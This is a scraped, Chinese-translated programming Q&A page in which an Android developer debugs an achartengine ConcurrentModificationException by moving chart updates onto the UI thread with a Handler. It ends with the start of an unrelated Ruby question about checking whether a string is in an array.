我正在开发一个应用程序，我正在使用 achartengine 绘制一个图表，该图表显示了现在要测试的随机数数据。它按预期工作，但在运行几秒钟后它会崩溃，并且当它试图让 run() 线程进入睡眠状态时它会崩溃。它是 LogCat：

```
04-22 18:22:02.253: I/(1902): run() -> LogicAnalizerView
04-22 18:22:02.262: I/(1902): run() -> LogicAnalizerView - input.add(5.1999974),factor[n]
04-22 18:22:02.271: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:02.271: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:02.781: I/(1902): run() -> LogicAnalizerView
04-22 18:22:02.781: I/(1902): run() -> LogicAnalizerView - input.add(5.2999973),factor[n]
04-22 18:22:02.802: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:02.802: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:03.182: D/dalvikvm(1902): GC_CONCURRENT freed 445K, 6% free 9330K/9863K, paused 42ms+33ms
04-22 18:22:03.522: I/(1902): run() -> LogicAnalizerView
04-22 18:22:03.522: I/(1902): run() -> LogicAnalizerView - input.add(5.399997),factor[n]
04-22 18:22:03.522: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:03.522: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:04.052: I/(1902): run() -> LogicAnalizerView
04-22 18:22:04.052: I/(1902): run() -> LogicAnalizerView - input.add(5.499997),factor[n]
04-22 18:22:04.084: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:04.084: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:04.607: I/(1902): run() -> LogicAnalizerView
04-22 18:22:04.612: I/(1902): run() -> LogicAnalizerView - input.add(5.599997),factor[n]
04-22 18:22:04.622: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:04.632: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:05.131: I/(1902): run() -> LogicAnalizerView
04-22 18:22:05.131: I/(1902): run() -> LogicAnalizerView - input.add(5.699997),factor[n]
04-22 18:22:05.163: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:05.163: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:05.687: I/(1902): run() -> LogicAnalizerView
04-22 18:22:05.687: I/(1902): run() -> LogicAnalizerView - input.add(5.799997),factor[n]
04-22 18:22:05.691: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:05.691: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:06.302: I/(1902): run() -> LogicAnalizerView
04-22 18:22:06.302: I/(1902): run() -> LogicAnalizerView - input.add(5.8999968),factor[n]
04-22 18:22:06.351: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:06.351: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:06.962: I/(1902): run() -> LogicAnalizerView
04-22 18:22:06.962: I/(1902): run() -> LogicAnalizerView - input.add(5.9999967),factor[n]
04-22 18:22:06.962: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:06.991: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:07.491: I/(1902): run() -> LogicAnalizerView
04-22 18:22:07.491: I/(1902): run() -> LogicAnalizerView - input.add(6.0999966),factor[n]
04-22 18:22:07.521: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:07.521: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:07.933: D/dalvikvm(1902): GC_CONCURRENT freed 436K, 6% free 9334K/9863K, paused 12ms+62ms
04-22 18:22:08.061: I/(1902): run() -> LogicAnalizerView
04-22 18:22:08.061: I/(1902): run() -> LogicAnalizerView - input.add(6.1999965),factor[n]
04-22 18:22:08.061: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:08.061: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:08.133: D/AndroidRuntime(1902): Shutting down VM
04-22 18:22:08.133: W/dalvikvm(1902): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
04-22 18:22:08.481: E/AndroidRuntime(1902): FATAL EXCEPTION: main
04-22 18:22:08.481: E/AndroidRuntime(1902): java.util.ConcurrentModificationException
04-22 18:22:08.481: E/AndroidRuntime(1902):     at java.util.TreeMap$MapIterator.stepForward(TreeMap.java:883)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at java.util.TreeMap$BoundedMap$BoundedIterator.stepForward(TreeMap.java:1484)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at java.util.TreeMap$BoundedMap$BoundedEntrySet$1.next(TreeMap.java:1512)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at java.util.TreeMap$BoundedMap$BoundedEntrySet$1.next(TreeMap.java:1510)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at org.achartengine.chart.XYChart.draw(XYChart.java:250)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at org.achartengine.GraphicalView.onDraw(GraphicalView.java:166)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.view.View.draw(View.java:10978)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.view.ViewGroup.drawChild(ViewGroup.java:2887)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2489)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.view.ViewGroup.drawChild(ViewGroup.java:2885)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2489)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.view.ViewGroup.drawChild(ViewGroup.java:2885)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2489)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.view.View.draw(View.java:10981)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.widget.FrameLayout.draw(FrameLayout.java:450)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at com.android.internal.policy.impl.PhoneWindow$DecorView.draw(PhoneWindow.java:2126)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.view.ViewRootImpl.draw(ViewRootImpl.java:2026)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1634)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.view.ViewRootImpl.handleMessage(ViewRootImpl.java:2442)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.os.Looper.loop(Looper.java:137)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at android.app.ActivityThread.main(ActivityThread.java:4424)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at java.lang.reflect.Method.invokeNative(Native Method)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at java.lang.reflect.Method.invoke(Method.java:511)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
04-22 18:22:08.481: E/AndroidRuntime(1902):     at dalvik.system.NativeStart.main(Native Method)
04-22 18:22:08.561: I/(1902): run() -> LogicAnalizerView
04-22 18:22:08.561: I/(1902): run() -> LogicAnalizerView - input.add(6.2999964),factor[n]
04-22 18:22:08.581: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:08.581: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:09.112: I/(1902): run() -> LogicAnalizerView
04-22 18:22:09.112: I/(1902): run() -> LogicAnalizerView - input.add(6.3999963),factor[n]
04-22 18:22:09.131: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:09.131: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:09.495: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:09.671: I/(1902): run() -> LogicAnalizerView
04-22 18:22:09.681: I/(1902): run() -> LogicAnalizerView - input.add(6.499996),factor[n]
04-22 18:22:09.691: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:09.701: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:09.731: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:10.231: I/(1902): run() -> LogicAnalizerView
04-22 18:22:10.231: I/(1902): run() -> LogicAnalizerView - input.add(6.599996),factor[n]
04-22 18:22:10.251: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:10.251: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:10.572: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:11.101: I/(1902): run() -> LogicAnalizerView
04-22 18:22:11.101: I/(1902): run() -> LogicAnalizerView - input.add(6.699996),factor[n]
04-22 18:22:11.101: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:11.101: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:11.155: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:11.615: I/(1902): run() -> LogicAnalizerView
04-22 18:22:11.615: I/(1902): run() -> LogicAnalizerView - input.add(6.799996),factor[n]
04-22 18:22:11.641: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:11.641: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:12.182: I/(1902): run() -> LogicAnalizerView
04-22 18:22:12.182: I/(1902): run() -> LogicAnalizerView - input.add(6.899996),factor[n]
04-22 18:22:12.213: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:12.213: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:12.381: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:12.581: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:12.762: I/(1902): run() -> LogicAnalizerView
04-22 18:22:12.762: I/(1902): run() -> LogicAnalizerView - input.add(6.9999957),factor[n]
04-22 18:22:12.821: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:12.821: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:13.134: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:13.351: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:13.361: I/(1902): run() -> LogicAnalizerView
04-22 18:22:13.361: I/(1902): run() -> LogicAnalizerView - input.add(7.0999956),factor[n]
04-22 18:22:13.361: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:13.361: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:13.491: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:13.551: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:13.873: I/(1902): run() -> LogicAnalizerView
04-22 18:22:13.873: I/(1902): run() -> LogicAnalizerView - input.add(7.1999955),factor[n]
04-22 18:22:13.873: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:13.873: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:14.001: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:14.073: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:14.422: I/(1902): run() -> LogicAnalizerView
04-22 18:22:14.422: I/(1902): run() -> LogicAnalizerView - input.add(7.2999954),factor[n]
04-22 18:22:14.422: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:14.422: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:14.541: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:14.621: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:14.921: I/(1902): run() -> LogicAnalizerView
04-22 18:22:14.933: I/(1902): run() -> LogicAnalizerView - input.add(7.3999953),factor[n]
04-22 18:22:14.953: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:14.953: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:15.151: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:15.401: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:15.461: I/(1902): run() -> LogicAnalizerView
04-22 18:22:15.461: I/(1902): run() -> LogicAnalizerView - input.add(7.499995),factor[n]
04-22 18:22:15.461: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:15.474: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:15.601: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:15.661: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:16.028: I/(1902): run() -> LogicAnalizerView
04-22 18:22:16.028: I/(1902): run() -> LogicAnalizerView - input.add(7.599995),factor[n]
04-22 18:22:16.031: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:16.031: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:16.171: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:16.241: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:16.591: I/(1902): run() -> LogicAnalizerView
04-22 18:22:16.591: I/(1902): run() -> LogicAnalizerView - input.add(7.699995),factor[n]
04-22 18:22:16.621: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:16.621: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:16.731: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:16.791: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:17.145: I/(1902): run() -> LogicAnalizerView
04-22 18:22:17.145: I/(1902): run() -> LogicAnalizerView - input.add(7.799995),factor[n]
04-22 18:22:17.145: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:17.145: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:17.271: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:17.331: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:17.684: I/(1902): run() -> LogicAnalizerView
04-22 18:22:17.684: I/(1902): run() -> LogicAnalizerView - input.add(7.899995),factor[n]
04-22 18:22:17.704: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:17.711: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:17.831: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:17.902: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:18.221: I/(1902): run() -> LogicAnalizerView
04-22 18:22:18.231: I/(1902): run() -> LogicAnalizerView - input.add(7.9999948),factor[n]
04-22 18:22:18.243: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:18.243: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:18.364: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:18.442: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:18.795: I/(1902): run() -> LogicAnalizerView
04-22 18:22:18.795: I/(1902): run() -> LogicAnalizerView - input.add(8.099995),factor[n]
04-22 18:22:18.802: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:18.815: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:18.932: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:18.991: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:19.371: I/(1902): run() -> LogicAnalizerView
04-22 18:22:19.371: I/(1902): run() -> LogicAnalizerView - input.add(8.199995),factor[n]
04-22 18:22:19.392: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:19.392: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:19.441: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:19.522: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:19.952: I/(1902): run() -> LogicAnalizerView
04-22 18:22:19.952: I/(1902): run() -> LogicAnalizerView - input.add(8.299995),factor[n]
04-22 18:22:19.952: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:19.952: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:20.002: I/dalvikvm(1902): threadid=3: reacting to signal 3
04-22 18:22:20.074: I/dalvikvm(1902): Wrote stack traces to '/data/anr/traces.txt'
04-22 18:22:20.513: I/(1902): run() -> LogicAnalizerView
04-22 18:22:20.513: I/(1902): run() -> LogicAnalizerView - input.add(8.399996),factor[n]
04-22 18:22:20.534: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:20.534: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:21.066: I/(1902): run() -> LogicAnalizerView
04-22 18:22:21.092: I/(1902): run() -> LogicAnalizerView - input.add(8.499996),factor[n]
04-22 18:22:21.102: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:21.112: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:21.623: I/(1902): run() -> LogicAnalizerView
04-22 18:22:21.623: I/(1902): run() -> LogicAnalizerView - input.add(8.599997),factor[n]
04-22 18:22:21.623: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:21.623: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:22.152: I/(1902): run() -> LogicAnalizerView
04-22 18:22:22.161: I/(1902): run() -> LogicAnalizerView - input.add(8.699997),factor[n]
04-22 18:22:22.173: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:22.182: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:22.711: I/(1902): run() -> LogicAnalizerView
04-22 18:22:22.761: I/(1902): run() -> LogicAnalizerView - input.add(8.799997),factor[n]
04-22 18:22:22.761: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:22.761: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:23.295: I/(1902): run() -> LogicAnalizerView
04-22 18:22:23.295: I/(1902): run() -> LogicAnalizerView - input.add(8.899998),factor[n]
04-22 18:22:23.314: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:23.314: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:23.884: I/(1902): run() -> LogicAnalizerView
04-22 18:22:23.884: I/(1902): run() -> LogicAnalizerView - input.add(8.999998),factor[n]
04-22 18:22:23.884: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:23.884: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:24.383: I/(1902): run() -> LogicAnalizerView
04-22 18:22:24.391: I/(1902): run() -> LogicAnalizerView - input.add(9.099998),factor[n]
04-22 18:22:24.391: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:24.391: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:24.901: I/(1902): run() -> LogicAnalizerView
04-22 18:22:24.901: I/(1902): run() -> LogicAnalizerView - input.add(9.199999),factor[n]
04-22 18:22:24.911: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:24.911: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:25.466: I/(1902): run() -> LogicAnalizerView
04-22 18:22:25.491: I/(1902): run() -> LogicAnalizerView - input.add(9.299999),factor[n]
04-22 18:22:25.511: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:25.511: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:26.045: I/(1902): run() -> LogicAnalizerView
04-22 18:22:26.045: I/(1902): run() -> LogicAnalizerView - input.add(9.4),factor[n]
04-22 18:22:26.071: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:26.071: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:26.592: I/(1902): run() -> LogicAnalizerView
04-22 18:22:26.601: I/(1902): run() -> LogicAnalizerView - input.add(9.5),factor[n]
04-22 18:22:26.613: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:26.613: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:27.133: I/(1902): run() -> LogicAnalizerView
04-22 18:22:27.133: I/(1902): run() -> LogicAnalizerView - input.add(9.6),factor[n]
04-22 18:22:27.141: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:27.161: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:27.682: I/(1902): run() -> LogicAnalizerView
04-22 18:22:27.682: I/(1902): run() -> LogicAnalizerView - input.add(9.700001),factor[n]
04-22 18:22:27.691: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:27.691: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:28.217: I/(1902): run() -> LogicAnalizerView
04-22 18:22:28.217: I/(1902): run() -> LogicAnalizerView - input.add(9.800001),factor[n]
04-22 18:22:28.221: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:28.231: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:28.779: I/(1902): run() -> LogicAnalizerView
04-22 18:22:28.781: I/(1902): run() -> LogicAnalizerView - input.add(9.900002),factor[n]
04-22 18:22:28.791: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:28.801: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:29.320: I/(1902): run() -> LogicAnalizerView
04-22 18:22:29.321: I/(1902): run() -> LogicAnalizerView - input.add(10.000002),factor[n]
04-22 18:22:29.321: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:29.331: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:29.882: I/(1902): run() -> LogicAnalizerView
04-22 18:22:29.882: I/(1902): run() -> LogicAnalizerView - input.add(10.100002),factor[n]
04-22 18:22:29.882: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:29.882: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:30.410: I/(1902): run() -> LogicAnalizerView
04-22 18:22:30.411: I/(1902): run() -> LogicAnalizerView - input.add(10.200003),factor[n]
04-22 18:22:30.411: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:30.411: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:30.931: I/(1902): run() -> LogicAnalizerView
04-22 18:22:30.931: I/(1902): run() -> LogicAnalizerView - input.add(10.300003),factor[n]
04-22 18:22:30.931: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:30.931: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:31.464: I/(1902): run() -> LogicAnalizerView
04-22 18:22:31.464: I/(1902): run() -> LogicAnalizerView - input.add(10.400003),factor[n]
04-22 18:22:31.464: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:31.464: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:32.020: I/(1902): run() -> LogicAnalizerView
04-22 18:22:32.021: I/(1902): run() -> LogicAnalizerView - input.add(10.500004),factor[n]
04-22 18:22:32.021: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:32.021: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:32.570: I/(1902): run() -> LogicAnalizerView
04-22 18:22:32.570: I/(1902): run() -> LogicAnalizerView - input.add(10.600004),factor[n]
04-22 18:22:32.570: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:32.570: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:33.094: I/(1902): run() -> LogicAnalizerView
04-22 18:22:33.094: I/(1902): run() -> LogicAnalizerView - input.add(10.700005),factor[n]
04-22 18:22:33.094: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:33.094: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:33.636: I/(1902): run() -> LogicAnalizerView
04-22 18:22:33.636: I/(1902): run() -> LogicAnalizerView - input.add(10.800005),factor[n]
04-22 18:22:33.636: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:33.661: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:34.192: I/(1902): run() -> LogicAnalizerView
04-22 18:22:34.192: I/(1902): run() -> LogicAnalizerView - input.add(10.900005),factor[n]
04-22 18:22:34.192: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:34.192: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:34.743: I/(1902): run() -> LogicAnalizerView
04-22 18:22:34.743: I/(1902): run() -> LogicAnalizerView - input.add(11.000006),factor[n]
04-22 18:22:34.743: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:34.743: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:35.271: I/(1902): run() -> LogicAnalizerView
04-22 18:22:35.271: I/(1902): run() -> LogicAnalizerView - input.add(11.100006),factor[n]
04-22 18:22:35.271: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:35.271: I/(1902): run() -> LogicAnalizerView - Thread.sleep()
04-22 18:22:35.803: I/(1902): run() -> LogicAnalizerView
04-22 18:22:35.803: I/(1902): run() -> LogicAnalizerView - input.add(11.2000065),factor[n]
04-22 18:22:35.811: I/(1902): run() -> LogicAnalizerView - mView.repaint()
04-22 18:22:35.811: I/(1902): run() -> LogicAnalizerView - Thread.sleep() 
```

据我所知，我认为问题出在 ConcurrentModificationException 上，我已经对此进行了调查，但我无法确定：/。

[http://developer.android.com/reference/java/util/ConcurrentModificationException.html](http://developer.android.com/reference/java/util/ConcurrentModificationException.html) http://developer.android.com/reference/java/util/Collection.html

这是我的一段 Java 代码，其中图表被重绘：

```
 //onResume() se llama al resumir la Activity y tambien al crearse la Activity
    @Override
    protected void onResume() {
        super.onResume();
        actionBar.setSelectedNavigationItem(2);     //seleccion el item 0 (LC)
        //Creo el Thread y lo inicio
        Running = true;
        myThread = new Thread(this);
        myThread.start();
    }

    //onPause() se llama cuando se pausa la Activity y tambien antes de su destruccion
    @Override
    protected void onPause() {
        super.onPause();
        //destruyo el Thread
        Running = false;
        try {
            myThread.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        myThread = null;    //pongo el Thread como null para no provocar errores
    }

    @Override
    public void run() {

        while(Running){

            int[] factor = {0, 2, 4, 6}; 

            if(DEBUG) Log.i(TAG, "run() -> LogicAnalizerView");

            data = USBMulti.getLogicAnalizerData();
            for(int n = 0; n < 4; ++n){
                if(bitTest(data,n)) factor[n] += 1;
            }

            if(DEBUG) Log.i(TAG, "run() -> LogicAnalizerView - input.add(" + time + "),factor[n]");
            input1.add(time,factor[0]);
            input2.add(time,factor[1]);
            input3.add(time,factor[2]);
            input4.add(time,factor[3]);

            if(DEBUG) Log.i(TAG, "run() -> LogicAnalizerView - mView.repaint()");
            mView.repaint();    // Redibujo el grafico
            time += 0.1;

            if(DEBUG) Log.i(TAG, "run() -> LogicAnalizerView - Thread.sleep()");

            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        }

    } 
```

谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-25T02:06:03.610

好的，我找到了解决方案。问题是我在一个不是 UI 线程的线程中更新 UI，所以我必须使用下面的处理程序并将修改 UI 的代码放在处理程序中，我从我的 run() 方法调用处理程序：

```
uiCallback.sendEmptyMessage(0); 
```

处理程序称为 uiCallback ，我以这种方式定义处理程序：

```
private Handler uiCallback = new Handler () {
    public void handleMessage (Message msg) {
        if (DEBUG) Log.i(TAG, "run() -> Handler");
        int[] factor = {0, 2, 4, 6};

        data = USBMulti.getLogicAnalizerData();
        for(int n = 0; n < 4; ++n) {
            if(bitTest(data,n)) factor[n] += 1;
        }

        input1.add(time,factor[0]);
        input2.add(time,factor[1]);
        input3.add(time,factor[2]);
        input4.add(time,factor[3]);

        if (DEBUG) Log.i(TAG, "run() -> LogicAnalizerView - mView.repaint()");
        if (mView != null) {
            mView.repaint(); // Redibujo el grafico
        }
        time += 0.1;
    }
}; 
```

所以我在 UI Thread 上重新绘制了图表，它工作得很好:)。

谢谢 ：）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:59:35.803

在我看来，您正在调用`.add`您的数据集，同时*achartengine*正在迭代同一数据集。

我不是 100% 确定重绘是如何工作的，但如果它在另一个线程中启动，您可能需要某种方式进行同步，以便它不会在您修改它的同时读取您的数据集。

不确切知道如何做到这一点，但我希望这能为您指明正确的方向。

# ruby - Ruby 字符串是否等于字符串数组中的一个字符串？

> ID：10270853
> 
> 赞同：8
> 
> 时间：2012-04-22T18:32:02.970
> 
> 标签：ruby, arrays, string

有没有一种简单的方法可以在查询中调用类似于数据库的东西？

["string1","mystring","string2"] 中是否存在“mystring” => 将返回 true

["string1","string2","string3"] 中是否存在“mystring” => 将返回 false

* * *

## 回答 #1

> 赞同：11
> 
